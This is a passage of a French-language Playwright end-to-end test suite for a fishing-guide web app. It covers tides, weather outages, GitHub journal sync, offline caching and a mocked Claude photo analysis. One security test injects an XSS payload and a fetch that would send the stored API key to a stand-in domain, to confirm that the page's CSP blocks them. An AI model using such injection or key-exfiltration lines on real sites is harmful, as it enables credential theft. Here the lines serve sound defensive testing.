    const st = await page.evaluate(() => Object.keys(localStorage).filter((k) => k.startsWith("bar:journal:")).map((k) => localStorage.getItem(k)).join(""));
    ok(/"duree":0.25/.test(st), L("session terminée : durée enregistrée"));
    ok(/Prises par spot/.test(await T(page)) && /bar\/h|durée non saisie/.test(await T(page)), L("journal : prises par spot affichées"));
    // Onglets de détail
    await tab(page, "Saison");
    ok(/Saison :/.test(await T(page)) && /L'année du bar/.test(await T(page)) && /Proies du mois/.test(await T(page)), L("onglet Saison : saison, année du bar, proies"));
    await tab(page, "Règles");
    ok(/Bien relâcher un bar/.test(await T(page)) && /Sécurité, spot par spot/.test(await T(page)), L("onglet Règles : réglementation, remise à l'eau, sécurité"));
    // Février : no-kill annoncé, année non vérifiée signalée
    await tab(page, "Synthèse");
    await page.fill('input[type="date"]', "2027-02-10");
    await page.waitForTimeout(900); await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);
    const tf = await T(page);
    ok(/No-kill obligatoire/.test(tf) && /à revérifier/.test(tf), L("février : no-kill annoncé, règles d'une autre année signalées"));
    await page.screenshot({ path: `${SHOTS}/${site}-v7.png` });
    ok(errors.length === 0, L("onglets : aucune erreur JavaScript" + (errors.length ? " — " + errors.slice(0, 2).join(" | ") : "")));
    await ctx.close();
  }
  // ── 2. Pannes météo ──
  for (const sc of ["allfail", "offline", "range"]) {
    const { ctx, page, errors } = await openApp(site, { scenario: sc });
    await waitText(page, /Météo indisponible/, 25000);
    const txt = await T(page);
    ok(/coef \d+/.test(txt) && /PM \d\dh\d\d/.test(txt), L(`${sc} : la marée reste affichée`));
    if (sc === "allfail") ok(/Open-Meteo n'a pas répondu/.test(txt) && /Simulated failure/.test(txt), L("allfail : message cite la réponse"));
    if (sc === "range") ok(/horizon/.test(txt), L("range : message d'horizon"));
    ok(errors.length === 0, L(`${sc} : aucune erreur JavaScript` + (errors.length ? " — " + errors[0] : "")));
    if (sc === "allfail") await page.screenshot({ path: `${SHOTS}/${site}-allfail.png` });
    await ctx.close();
  }
  // ── 3. Dégradation marine ──
  {
    const { ctx, page, errors } = await openApp(site, { scenario: "marinefail" });
    await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);
    await tab(page, "Météo");
    ok(/Houle et température d'eau indisponibles/.test(await T(page)), L("marine en panne : alerte visible, météo affichée"));
    ok(errors.length === 0, L("marine en panne : aucune erreur JavaScript"));
    await ctx.close();
  }
}

// ── 4. Sauvegarde GitHub du journal ──
{
  const SYNC = { owner: "FelixMuzellec", repo: "guide-peche-bar-journal", token: "github_pat_TEST" };
  // a) dépôt vide → premier enregistrement crée le fichier (seeds compris)
  const gh = fakeGitHub();
  const { ctx, page, errors } = await openApp("logonna", { sync: SYNC, gh });
  await waitText(page, READY);
  await tab(page, "Journal");
  await page.fill('input[placeholder^="Asturie"]', "Z Claw blanc nacré e2e");
  await btn(page, /^Enregistrer$/).click();
  await waitText(page, /Journal sauvegardé sur GitHub/, 10000);
  const f = gh.files.get("journal-logonna-daoulas.json");
  const arr = f ? JSON.parse(f.content) : [];
  ok(arr.some((e) => /Z Claw blanc nacré e2e/.test(e.lure)), "GitHub : la session est écrite dans le dépôt");
  ok(arr.length >= 4, `GitHub : les 3 sessions archivées sont aussi sauvegardées (${arr.length})`);
  ok(/Z Claw blanc nacré e2e/.test(f?.content || "") && /é/.test(f.content), "GitHub : UTF-8 préservé (accents)");
  ok(errors.length === 0, "GitHub : aucune erreur JavaScript" + (errors.length ? " — " + errors[0] : ""));
  await page.screenshot({ path: `${SHOTS}/sync-ok.png` });
  await ctx.close();

  // b) autre appareil : le journal du dépôt est récupéré au démarrage
  const remote = JSON.stringify([...arr, { id: "log-remote-1", spotId: "bendy", date: "2026-09-30", result: 7, fish: 2, lure: "Session venue du téléphone", predicted: null, note: "" }]);
  const gh2 = fakeGitHub({ files: { "journal-logonna-daoulas.json": remote } });
  const o2 = await openApp("logonna", { sync: SYNC, gh: gh2 });
  await waitText(o2.page, READY);
  const local2 = await o2.page.evaluate(() => localStorage.getItem("bar:journal:logonna-daoulas") || "");
  ok(/Session venue du téléphone/.test(local2), "autre appareil : sessions du dépôt récupérées au démarrage");
  await tab(o2.page, "Journal");
  ok(/Pointe du Bendy/.test(await T(o2.page)), "autre appareil : la session récupérée apparaît dans le journal");
  await o2.ctx.close();

  // c) conflit d'écriture : relecture, fusion, nouvelle écriture
  const gh3 = fakeGitHub({ conflicts: 1 });
  const o3 = await openApp("pirou", { sync: SYNC, gh: gh3 });
  await waitText(o3.page, READY);
  await tab(o3.page, "Journal");
  await btn(o3.page, /^Enregistrer$/).click();
  await waitText(o3.page, /Journal sauvegardé sur GitHub/, 10000);
  ok(gh3.files.has("journal-pirou-plage.json"), "conflit 409 : résolu par relecture et fusion");
  await o3.ctx.close();

  // d) jeton refusé : message clair, l'application fonctionne
  const gh4 = fakeGitHub({ status401: true });
  const o4 = await openApp("logonna", { sync: SYNC, gh: gh4 });
  await waitText(o4.page, READY);
  ok(/jeton refusé/.test(await T(o4.page)), "jeton refusé : message explicite, application utilisable");
  await o4.ctx.close();

  // e) réglages : saisie du jeton depuis l'interface
  const gh5 = fakeGitHub();
  const o5 = await openApp("logonna", { gh: gh5 });
  await waitText(o5.page, READY);
  await o5.page.getByRole("button", { name: "Réglages" }).click();
  await o5.page.screenshot({ path: `${SHOTS}/sync-settings.png` });
  await o5.page.fill('input[type="password"]', "github_pat_TEST");
  await o5.page.getByRole("button", { name: "Enregistrer et tester" }).click();
  await waitText(o5.page, /Journal sauvegardé sur GitHub/, 10000);
  ok(await o5.page.evaluate(() => JSON.parse(localStorage.getItem("bar:sync") || "{}").token === "github_pat_TEST"), "réglages : jeton testé puis mémorisé sur l'appareil");
  await tab(o5.page, "Journal");
  await btn(o5.page, /^Enregistrer$/).click();
  await o5.page.waitForTimeout(2500);
  ok(gh5.files.has("journal-logonna-daoulas.json"), "réglages : la session suivante part sur GitHub");
  await o5.ctx.close();
}

// ── 5. Hors ligne sur le spot (service worker) ──
{
  const ctx = await browser.newContext({ ...devices["iPhone 13"], locale: "fr-FR", timezoneId: "Europe/Paris", serviceWorkers: "allow" });
  const { page, errors } = await openApp("logonna", { context: ctx, sw: "allow" });
  await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);
  await page.evaluate(() => navigator.serviceWorker.ready);
  await page.reload(); await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);   // page désormais contrôlée par le SW
  await ctx.setOffline(true);
  await page.reload();
  await waitText(page, READY, 15000);
  await page.waitForTimeout(800);
  const txt = await T(page);
  ok(/coef \d+/.test(txt) && /PM \d\dh\d\d/.test(txt), "hors ligne : l'application s'ouvre, marée calculée");
  ok(/🌬 [A-Z]{1,3} \d+ km\/h/.test(txt), "hors ligne : dernière météo téléchargée réaffichée");
  ok(errors.filter((e) => !/net::|Failed to fetch/.test(e)).length === 0, "hors ligne : aucune erreur JavaScript");
  // Toute l'application est en cache dès l'installation du service worker, y compris les pages pas encore ouvertes.
  const cached = await page.evaluate(async () => { const c = await caches.open((await caches.keys())[0]); return (await c.keys()).map((r) => new URL(r.url).pathname); });
  const want = ["/", ...SITE_FILES.filter((f) => f !== "sw.js").map((f) => `/${f}`)].map((x) => PREFIX + x);
  ok(want.every((w) => cached.includes(w)), "hors ligne : accueil, cinq guides, manifeste et icônes en cache" + (want.every((w) => cached.includes(w)) ? "" : " — " + cached.join(", ")));
  await page.goto(`${BASE}/`);
  ok(/Logonna-Daoulas/.test(await T(page)) && /Pirou Plage/.test(await T(page)), "hors ligne : l'accueil s'ouvre");
  await page.click('a[href="pirou.html"]'); await waitText(page, READY, 15000);
  ok(/coef \d+/.test(await T(page)), "hors ligne : accueil → Pirou (jamais ouvert) : marée calculée");
  await page.goto(`${BASE}/audierne.html`); await waitText(page, READY, 15000);
  ok(/coef \d+/.test(await T(page)), "hors ligne : Audierne (jamais ouvert) : marée calculée");
  await ctx.close();
}

// ── 5 ter. Sécurité : la politique CSP bloque une injection et une fuite de données ──
// (contexte non surveillé : les violations provoquées ici sont voulues)
{
  const { ctx, page } = await openApp("logonna", { context: await _newContext({ ...devices["iPhone 13"], locale: "fr-FR", timezoneId: "Europe/Paris", serviceWorkers: "block" }) });
  await waitText(page, WX);
  const csp = await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || "");
  ok(/script-src 'sha256-[A-Za-z0-9+/=]+'/.test(csp) && !/unsafe-inline'[^;]*;?\s*$/.test(csp.split(";").find((x) => /script-src/.test(x)) || "") && /connect-src 'self' https:\/\/api\.open-meteo\.com/.test(csp), "[sécurité] CSP : seul le script de la page, connexions limitées");
  const r = await page.evaluate(async () => {
    const seen = [];
    document.addEventListener("securitypolicyviolation", (e) => seen.push(e.violatedDirective));
    document.body.insertAdjacentHTML("beforeend", '<img src="x" onerror="window.__xss = 1">');
    const s = document.createElement("script"); s.textContent = "window.__xss2 = 1"; document.body.appendChild(s);
    let leaked = true;
    try { await fetch("https://exemple.invalid/?k=" + encodeURIComponent(localStorage.getItem("bar:claude") || "")); } catch { leaked = false; }
    await new Promise((ok) => setTimeout(ok, 300));
    return { xss: window.__xss === 1 || window.__xss2 === 1, leaked, seen };
  });
  ok(!r.xss, "[sécurité] un script injecté dans la page ne s'exécute pas");
  ok(!r.leaked && r.seen.some((d) => /connect-src/.test(d)), "[sécurité] envoi vers un domaine inconnu bloqué (connect-src)");
  await ctx.close();
}

// ── 5 bis. Corrections sur place : profondeur, eau du jour, boîte, journal structuré ──
{
  const { ctx, page, errors } = await openApp("logonna");
  const L = (s) => `[terrain] ${s}`;
  await waitText(page, WX);
  // Profondeur donnée pour le spot actif
  await tab(page, "Spots");
  await btn(page, /^Terrain$/).click();
  await page.fill('input[aria-label="Profondeur en mètres à mi-marée"]', "6");
  await page.getByRole("button", { name: "Enregistrer", exact: true }).first().click();
  await page.waitForTimeout(300);
  ok(/6 m à mi-marée \(donné par toi\)/.test(await T(page)) && /Corrigé le .*\(profondeur\), par toi, sur place/.test(await T(page)), L("profondeur donnée sur place : affichée et tracée"));
  const spotName = await page.evaluate(() => document.querySelector("h2")?.textContent || "");
  // Eau du jour, dans l'onglet Leurres, pour ce même spot
  await tab(page, "Leurres");
  ok((await page.inputValue('select[aria-label="Spot"]')) && new RegExp(spotName.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")).test(await T(page)), L("onglet Leurres : même spot que la fiche"));
  ok(/donné par toi/.test(await T(page)), L("leurres : la profondeur donnée sert au conseil"));
  await page.getByRole("button", { name: "chargée", exact: true }).click();
  await page.waitForTimeout(300);
  ok(/Eau chargée : observée par toi aujourd'hui/.test(await T(page)) && /💧 eau chargée/.test(await T(page)), L("eau observée : remplace l'estimation"));
  // Boîte corrigée : poids pesé et nage du balsa
  await page.getByText("Corriger ta boîte").click();
  await page.fill('input[aria-label="Poids pesé Xorus Asturie 130"]', "26");
  await page.locator('input[aria-label="Poids pesé Xorus Asturie 130"]').blur();
  await page.selectOption('select[aria-label="Nage du leurre balsa"]', "sous-surface");
  await page.waitForTimeout(300);
  await page.getByText("Fiches techniques de ta boîte").click();
  const tx = await T(page);
  ok(/26 g pesé par toi \(fiche : 27 g\)/.test(tx) && /poisson nageur en balsa, nage sous la surface/.test(tx), L("boîte corrigée : poids pesé et nage du balsa affichés"));
  const box = await page.evaluate(() => JSON.parse(localStorage.getItem("bar:boite") || "{}"));
  ok(box.poids?.["asturie:130"] === 26 && box.balsa?.nage === "sous-surface", L("boîte corrigée : enregistrée, commune aux deux guides"));
  // Journal : leurre choisi dans la boîte, avec poids et couleur
  await tab(page, "Journal");
  await page.selectOption('select[aria-label="Leurre principal"]', { label: "Sakura Mr Joe 120" });
  ok((await page.inputValue('input[aria-label="Poids ou tête du leurre"]')) === "35 g", L("journal : poids prérempli d'après la fiche"));
  await page.fill('input[aria-label="Couleur du leurre"]', "Blanc");
  await page.fill('input[type="time"]', "18:30");
  await page.fill('input[type="number"]', "2");
  await btn(page, /^Enregistrer$/).click();
  await page.waitForTimeout(500);
  const j = await page.evaluate(() => Object.keys(localStorage).filter((k) => k.startsWith("bar:journal:")).flatMap((k) => JSON.parse(localStorage.getItem(k) || "[]")));
  const e = j.find((x) => x.lureRef?.cat === "mrjoe");
  ok(e && e.lureRef.len === 120 && e.lureW === "35 g" && e.lureColor === "Blanc" && /Sakura Mr Joe 120 · 35 g · Blanc/.test(e.lure) && e.fish === 2, L("journal : leurre structuré enregistré (modèle, poids, couleur, prises)"));
  // Après rechargement, tout est conservé
  await page.reload(); await waitText(page, /Nouvelle session/);
  await tab(page, "Leurres");
  ok(/Eau chargée : observée par toi aujourd'hui/.test(await T(page)) && /donné par toi/.test(await T(page)), L("rechargement : eau du jour et profondeur conservées"));
  ok(errors.length === 0, L("aucune erreur JavaScript") + (errors.length ? " — " + errors.join(" | ") : ""));
  await ctx.close();
}

// ── 6. Analyse photo (API Anthropic simulée) ──
{
  const PH = path.join(ROOT, "tests/ref/photos");
  const cors = { "access-control-allow-origin": "*", "access-control-allow-headers": "*", "access-control-allow-methods": "GET, POST, OPTIONS" };
  const reply = (o, usage = { input_tokens: 12000, output_tokens: 3000 }) => ({ model: "claude-opus-5-5", stop_reason: "end_turn", usage,
    content: [{ type: "thinking", thinking: "…" }, { type: "text", text: JSON.stringify(o) }] });
  const PASS1 = { photos: [{ photo: 1, vue: "Pointe rocheuse vue du haut de la grève", qualite: "bonne", limites: "contre-jour à droite" }, { photo: 2, vue: "Anse vue de face", qualite: "moyenne", limites: "" }],
    observations: [
      { photo: 1, zone: "premier plan gauche", x: 22, y: 78, categorie: "roche", fait: "Platier rocheux découvert, couvert d'algues brunes", confiance: "elevee" },
      { photo: 1, zone: "plan moyen, centre", x: 50, y: 52, categorie: "surface_eau", fait: "Ligne d'écume allongée parallèle à la pointe", confiance: "moyenne" },
      { photo: 2, zone: "centre", x: 48, y: 70, categorie: "vegetation", fait: "Taches sombres sous la surface, peut-être un herbier", confiance: "faible" },
      { photo: 2, zone: "arrière-plan droit", x: 85, y: 30, categorie: "vie", fait: "Oiseaux plongeant en groupe", confiance: "faible" },
      { photo: 7, zone: "centre", x: 50, y: 50, categorie: "roche", fait: "Photo qui n'existe pas", confiance: "elevee" }],
    non_visible: ["Profondeur au pied du platier", "Nature du fond hors des zones découvertes"] };
  const PASS2 = { verdicts: [{ id: "o1", statut: "confirme", raison: "Net au premier plan" }, { id: "o2", statut: "confirme", raison: "Visible" },
    { id: "o3", statut: "douteux", raison: "Reflets possibles" }, { id: "o4", statut: "absent", raison: "Aucun oiseau visible" }] };
  const PASS3 = { synthese: "Pointe rocheuse avec une veine marquée le long du platier.",
    lecture: [{ titre: "Courant", texte: "La ligne d'écume signale une veine le long de la pointe.", nature: "deduit", refs: ["o2"] }],
    postes: [{ nom: "Bordure du platier", emplacement: "photo 1, premier plan gauche", pourquoi: "Rupture roche-eau au bord de la veine.", moment: "à la marée de la photo", confiance: "moyenne", refs: ["o1", "o2", "t1"] },
      { nom: "Herbier", emplacement: "photo 2, centre", pourquoi: "Abri possible.", moment: "non déterminable avec ces photos", confiance: "faible", refs: ["o3"] },
      { nom: "Chasse", emplacement: "photo 2", pourquoi: "Oiseaux.", moment: "maintenant", confiance: "elevee", refs: ["o4"] }],
    approche: [{ texte: "Lancer en biais vers la ligne d'écume, depuis le haut du platier.", refs: ["o1", "o2"] }],
    securite: [{ texte: "Algues glissantes sur le platier.", refs: ["o1"] }],
    accroche: { niveau: "fort", raison: "Platier rocheux et algues jusqu'au bord.", refs: ["o1", "f2"] },
    leurres: [{ famille: "surface", pourquoi: "Passer au-dessus des algues, le long de la veine.", refs: ["o1", "o2"] }],
    fiche: [{ point: "Fond", fiche_dit: "roches et goémon", photos_montrent: "platier couvert d'algues", accord: "accord", refs: ["f2", "o1"] }],
    a_verifier: ["Profondeur au pied du platier à basse mer"],
    propositions: [{ champ: "couches", valeur: "surface", raison: "Algues jusqu'à la surface sur tout le platier visible.", refs: ["o1", "o2"] },
      { champ: "encombrement", valeur: "2", raison: "Herbier possible.", refs: ["o3"] },
      { champ: "gratter", valeur: "bof", raison: "?", refs: ["o1"] }] };
  const api = { reqs: [], fail: null, delay: {}, n: { 1: 0, 2: 0, 3: 0 } };
  const ctx = await browser.newContext({ ...devices["iPhone 13"], locale: "fr-FR", timezoneId: "Europe/Paris", serviceWorkers: "block", permissions: ["clipboard-read", "clipboard-write"] });
  await ctx.route(/api\.anthropic\.com/, async (route) => {
    const req = route.request();
    if (req.method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
    const h = req.headers(); const u = new URL(req.url());
    const key = h["x-api-key"];
    if (u.pathname === "/v1/models") return route.fulfill({ status: key === "sk-ant-test" ? 200 : 401, headers: cors, contentType: "application/json", body: JSON.stringify(key === "sk-ant-test" ? { data: [] } : { error: { type: "authentication_error", message: "invalid x-api-key" } }) });
    const body = JSON.parse(req.postData());
    const pass = /^Tu es l'œil/.test(body.system) ? 1 : /^Tu es un contrôleur/.test(body.system) ? 2 : 3;
    api.reqs.push({ h, body, pass }); api.n[pass]++;
    if (api.delay[pass]) await new Promise((r) => setTimeout(r, api.delay[pass]));
    const f = api.fail && (api.fail.pass == null || api.fail.pass === pass) ? api.fail : null;
    try {
      if (f) return await route.fulfill({ status: f.status, headers: cors, contentType: "application/json", body: JSON.stringify(f.body) });
      return await route.fulfill({ status: 200, headers: cors, contentType: "application/json", body: JSON.stringify(reply(pass === 1 ? PASS1 : pass === 2 ? PASS2 : PASS3)) });
    } catch { /* page rechargée pendant la réponse */ }
  });
  const { page, errors } = await openApp("logonna", { context: ctx });
  const L = (s) => `[photo] ${s}`;
  const choose = (files) => page.setInputFiles('input[aria-label="Photos du spot"]', files.map((f) => path.join(PH, f)));
  await waitText(page, WX);
  await tab(page, "Photos");
  ok(/Méthode en trois passes/.test(await T(page)) && /Clé API Claude/.test(await T(page)), L("onglet Photos : méthode expliquée, clé demandée"));
  ok(await page.getByRole("link", { name: /Créer une clé sur platform\.claude\.com/ }).getAttribute("href") === "https://platform.claude.com/settings/keys", L("lien direct vers la création de la clé"));
  ok(await page.getByRole("link", { name: /Ajouter du crédit/ }).getAttribute("href") === "https://platform.claude.com/settings/billing", L("lien direct vers l'achat de crédit"));
  await page.fill('input[type=password]', "sk-ant-mauvaise");
  await btn(page, "Enregistrer et tester").click();
  await waitText(page, /Clé API refusée/, 5000).catch(() => {});
  ok(/Clé API refusée/.test(await T(page)) && !(await page.evaluate(() => localStorage.getItem("bar:claude"))), L("clé refusée : message clair, rien d'enregistré"));
  await page.fill('input[type=password]', "sk-ant-test");
  await btn(page, "Enregistrer et tester").click();
  await waitText(page, /Nouvelle analyse/, 5000);
  ok(JSON.parse(await page.evaluate(() => localStorage.getItem("bar:claude"))).key === "sk-ant-test", L("clé acceptée : enregistrée sur l'appareil"));
  await choose(["exif_complet.jpg", "sans_exif_grande.jpg"]);
  await waitText(page, /Photo 2 ·/, 10000);
  const t1 = await T(page);
  ok(/Photo 1 · 14\/10\/2026 à 18h40/.test(t1) && /date de prise de vue de la photo/.test(t1) && /position GPS lue/.test(t1), L("photo 1 : date EXIF et position lues"));
  ok(/Photo 1 prise à 0,1 km du spot le plus proche : Moulin Mer/.test(t1), L("photo 1 : spot le plus proche proposé d'après la position"));
  ok(/date du fichier/.test(t1) && /Heure de prise de vue des photos sans date/.test(t1), L("photo 2 sans EXIF : date du fichier signalée, heure à saisir proposée"));
  ok(/coût estimé : \d+,\d\d \$ à \d+,\d\d \$/.test(t1), L("coût estimé affiché avant l'analyse"));
  if (await page.getByRole("button", { name: "Choisir ce spot" }).count()) await btn(page, "Choisir ce spot").click();
  await page.fill('input[type=datetime-local]', "2026-10-14T19:30");
  await page.fill("textarea", "Fond de roches, 2 bars pris ici en décembre.");
  // La sélection survit à un changement d'onglet
  await tab(page, "Marée"); await tab(page, "Photos");
  ok(/Photo 2 ·/.test(await T(page)) && await page.$eval('select[aria-label="Spot analysé"]', (s) => s.value) === "moulinmer" && await page.$eval("textarea", (x) => x.value) === "Fond de roches, 2 bars pris ici en décembre.", L("photos, spot et notes gardés après un changement d'onglet"));
  // L'analyse continue quand on quitte l'onglet ; un bandeau la suit et annonce la fin
  api.delay = { 1: 1500, 2: 1500 };
  await btn(page, "Analyser").click();
  await waitText(page, /Passe 1 sur 3/, 5000);
  await tab(page, "Synthèse");
  await waitText(page, /Analyse photo · passe \d\/3 en cours/, 5000).catch(() => {});
  ok(/Analyse photo · passe \d\/3 en cours/.test(await T(page)), L("autre onglet : bandeau « analyse en cours »"));
  await waitText(page, /Analyse photo prête/, 15000).catch(() => {});
  ok(/Analyse photo prête/.test(await T(page)), L("autre onglet : l'analyse a continué jusqu'au bout"));
  await btn(page, "Voir").click();
  await waitText(page, /Lecture du spot/, 5000);
  api.delay = {};
  await page.screenshot({ path: path.join(SHOTS, "photos-resultat-logonna.png"), fullPage: true });
  const t2 = await T(page);
  ok(!/Analyse photo prête/.test(t2), L("résultat vu : bandeau retiré"));
  const [q1, q2, q3] = api.reqs;
  ok(api.reqs.length === 3 && q1.h["anthropic-dangerous-direct-browser-access"] === "true" && q1.h["x-api-key"] === "sk-ant-test" && q1.body.model === "claude-opus-5-5", L("3 appels, clé et en-tête d'accès direct, modèle Opus 5.5"));
  const imgs = q1.body.messages[0].content.filter((b) => b.type === "image");
  const dims = imgs.map((b) => { const buf = Buffer.from(b.source.data, "base64"); let p = 2; while (p < buf.length) { const mk = buf[p + 1], len = buf.readUInt16BE(p + 2); if (mk >= 0xc0 && mk <= 0xc2) return { h: buf.readUInt16BE(p + 5), w: buf.readUInt16BE(p + 7), exif: buf.includes(Buffer.from("Exif")) }; p += 2 + len; } return null; });
  ok(imgs.length === 2 && dims.every((d) => d && Math.max(d.w, d.h) <= 2000) && Math.max(dims[1].w, dims[1].h) === 2000, L(`images réduites à 2000 px au plus (${dims.map((d) => d && `${d.w}×${d.h}`).join(", ")})`));
  ok(dims.every((d) => d && !d.exif), L("images envoyées sans métadonnées (ni date ni position)"));
  ok(q2.body.messages[0].content.filter((b) => b.type === "image").length === 2 && /o4 · photo 2 · arrière-plan droit \(≈ x 85 %, y 30 %\)/.test(q2.body.messages[0].content.at(-1).text) && !/o5/.test(q2.body.messages[0].content.at(-1).text), L("vérification : photos renvoyées avec positions ; observation hors photo écartée"));
  const q3t = q3.body.messages[0].content.map((b) => b.text || "").join("");
  ok(!q3.body.messages[0].content.some((b) => b.type === "image") && /t1 · Photo 1 : prise le 14\/10\/2026 à 18h40/.test(q3t) && /Marée (montante|descendante)/.test(q3t) && /t2 · Photo 2 : prise le 14\/10\/2026 à 19h30 \(heure saisie par toi\)/.test(q3t), L("lecture : texte seul, marée calculée pour chaque heure de prise de vue"));
  ok(/f2 · Fond/.test(q3t) && /u1 · Fond de roches/.test(q3t) && !/o4 ·/.test(q3t) && /o3 · .*INCERTAIN/.test(q3t), L("lecture : fiche, notes, observation écartée absente, incertaine signalée"));
  ok(q1.body.output_config?.format?.type === "json_schema" && q1.body.output_config.effort === "high", L("sorties structurées demandées"));
  ok(/Pointe rocheuse avec une veine marquée/.test(t2) && /Bordure du platier/.test(t2), L("compte rendu : synthèse et poste fondé affichés"));
  const head = t2.split("Tous les faits")[0];
  ok(!/Herbier\n/.test(head) && !/Chasse\n/.test(head), L("postes fondés sur un fait incertain ou écarté : non affichés"));
  ok(/2 faits confirmés/.test(t2) && /1 incertain\b/.test(t2) && /5 écartés/.test(t2), L("compteurs : confirmés, incertains, écartés"));
  ok(/Risque d'accroche : fort/.test(t2) && /Stickbait : Passer au-dessus des algues/.test(t2) && /✓ Fond/.test(t2), L("accroches, leurres et confrontation avec la fiche"));
  ok(/Ce que les photos ne disent pas/.test(t2) && /Profondeur au pied du platier/.test(t2) && /À vérifier sur place/.test(t2), L("limites des photos et vérifications listées"));
  ok(/0,\d\d \$ · \d+:\d\d/.test(t2), L("coût réel et durée affichés"));
  // Faits ouverts sur place
  await page.getByRole("button", { name: "Fait t1", exact: true }).first().click();
  await page.waitForTimeout(200);
  ok(/t1 · Photo 1 : prise le 14\/10\/2026 à 18h40/.test(await T(page)) && await page.getByRole("button", { name: "Fait t1", exact: true }).first().getAttribute("aria-expanded") === "true", L("repère t1 : le fait s'affiche sous l'élément, sans quitter la lecture"));
  await page.getByRole("button", { name: "Fait o1", exact: true }).first().click();
  await page.waitForTimeout(200);
  ok(await page.getByRole("button", { name: "Voir o1 sur la photo 1" }).count() > 0, L("repère o1 : la photo et la zone apparaissent avec le fait"));
  // Visionneuse plein écran
  await page.getByRole("button", { name: "Agrandir la photo 1" }).click();
  await page.waitForSelector('[role=dialog][aria-modal=true]');
  const dlg = await page.evaluate(() => { const d = document.querySelector("[role=dialog]"); return { txt: d.innerText, o1: !!d.querySelector('[aria-label="Repère o1"]'), p1: !!d.querySelector('[aria-label^="Poste P1"]'), focus: document.activeElement?.getAttribute("aria-label") }; });
  await page.screenshot({ path: path.join(SHOTS, "photos-plein-ecran.png") });
  ok(/Photo 1 \/ 2/.test(dlg.txt) && dlg.o1 && dlg.p1 && /positions approximatives/.test(dlg.txt) && dlg.focus === "Fermer", L("plein écran : photo, repères des observations et du poste P1, positions dites approximatives"));
  await page.getByRole("button", { name: "Photo suivante" }).click();
  ok(/Photo 2 \/ 2/.test(await page.evaluate(() => document.querySelector("[role=dialog]").innerText)), L("plein écran : photo suivante"));
  await page.keyboard.press("Escape");
  ok(!(await page.$("[role=dialog]")), L("plein écran : fermé par Échap"));
  // Propositions pour la fiche
  ok(/Proposé pour la fiche du spot/.test(t2) && /Couches pêchables : surface/.test(t2) && !/Encombrement 2\/3/.test(t2), L("propositions : seule celle fondée sur un fait confirmé est proposée"));
  await btn(page, "Appliquer à la fiche").click();
  await page.waitForTimeout(300);
  const ov = JSON.parse(await page.evaluate(() => localStorage.getItem("bar:terrain:logonna-daoulas")));
  ok(ov?.moulinmer?.couches?.join() === "surface" && /✓ Appliqué à la fiche/.test(await T(page)), L("proposition appliquée : enregistrée sur l'appareil"));
  await tab(page, "Spots");
  if (await page.getByRole("button", { name: /^Voir les \d+/ }).count()) await btn(page, /^Voir les \d+/).click();
  await page.getByRole("button", { name: /Moulin Mer/ }).first().click();
  await page.waitForTimeout(400);
  await btn(page, /^Terrain$/).click();
  await page.waitForTimeout(300);
  const sp = await T(page);
  ok(/Corrigé le .*\(couches\), d.après une analyse photo validée par toi/.test(sp) && /Couches à pêcher : surface\./.test(sp), L("fiche du spot : correction affichée, avec sa trace"));
  await tab(page, "Photos");
  await btn(page, "Annuler").click();
  await page.waitForTimeout(300);
  ok(!JSON.parse(await page.evaluate(() => localStorage.getItem("bar:terrain:logonna-daoulas")) || "{}").moulinmer, L("correction annulée : la fiche revient à l'origine"));
  await btn(page, "Copier le compte rendu").click();
  await page.waitForTimeout(300);
  const clip = await page.evaluate(() => navigator.clipboard.readText()).catch(() => "");
  ok(/Analyse photo — Moulin Mer/.test(clip) && /\[o1, o2, t1\]/.test(clip), L("compte rendu copié avec ses références"));
  // Rechargement pendant une analyse : reprise à la passe manquante, sans refaire les autres
  api.reqs.length = 0; api.n = { 1: 0, 2: 0, 3: 0 }; api.delay = { 2: 6000 };
  await choose(["exif_sans_fuseau.jpg"]);
  await waitText(page, /Photo 1 ·/, 10000);
  await btn(page, "Analyser").click();
  await waitText(page, /Passe 2 sur 3/, 8000);
  await page.screenshot({ path: path.join(SHOTS, "photos-en-cours.png"), fullPage: true });
  await page.reload();   // l'adresse garde #photos : l'onglet Photos rouvre directement
  await waitText(page, /Reprendre à la passe 2/, 10000).catch(() => {});
  const tr = await T(page);
  ok(/Analyse interrompue/.test(tr) && /Reprendre à la passe 2/.test(tr) && /Inventaire, pas encore vérifié/.test(tr), L("après rechargement : analyse interrompue, inventaire gardé, reprise proposée"));
  api.delay = {};
  await btn(page, "Reprendre à la passe 2").click();
  await waitText(page, /Lecture du spot/, 15000);
  ok(api.n[1] === 1 && api.n[2] === 2 && api.n[3] === 1, L(`reprise : la passe 1 n'est pas refaite (passes envoyées ${api.n[1]}/${api.n[2]}/${api.n[3]})`));
  // Erreur à la dernière passe : reprise de la seule passe 3
  api.n = { 1: 0, 2: 0, 3: 0 };
  api.fail = { pass: 3, status: 400, body: { error: { type: "invalid_request_error", message: "Your credit balance is too low to access the Anthropic API." } } };
  await choose(["exif_complet.jpg"]);
  await waitText(page, /Photo 1 ·/, 10000);
  await btn(page, "Analyser").click();
  await waitText(page, /Crédit API épuisé/, 10000).catch(() => {});
  const te = await T(page);
  ok(/Crédit API épuisé/.test(te) && /Déjà facturé : \d+,\d\d \$/.test(te) && /Reprendre à la passe 3/.test(te), L("crédit épuisé à la passe 3 : message clair, coût déjà engagé, reprise proposée"));
  api.fail = null;
  await btn(page, "Reprendre à la passe 3").click();
  await waitText(page, /Lecture du spot/, 15000);
  ok(api.n[1] === 1 && api.n[2] === 1 && api.n[3] === 2, L("reprise : seule la passe 3 est refaite"));
  // Historique
  await page.reload();
  await waitText(page, /Analyses enregistrées/, 10000);
  const opens = page.getByRole("button", { name: /^Moulin Mer\s*photos du/ });
  const histTxt = (await T(page)).split("Analyses enregistrées")[1] || "";
  ok((await opens.count()) === 3 && /2 photos/.test(histTxt), L(`analyses conservées après rechargement (${await opens.count()}) — ${histTxt.replace(/\n+/g, " | ").slice(0, 400)}`));
  await opens.last().click();
  await waitText(page, /Bordure du platier/, 5000);
  ok(true, L("analyse enregistrée rouverte"));
  ok(errors.length === 0, L(`aucune erreur JavaScript${errors.length ? " — " + errors.join(" | ") : ""}`));
  await ctx.close();
}

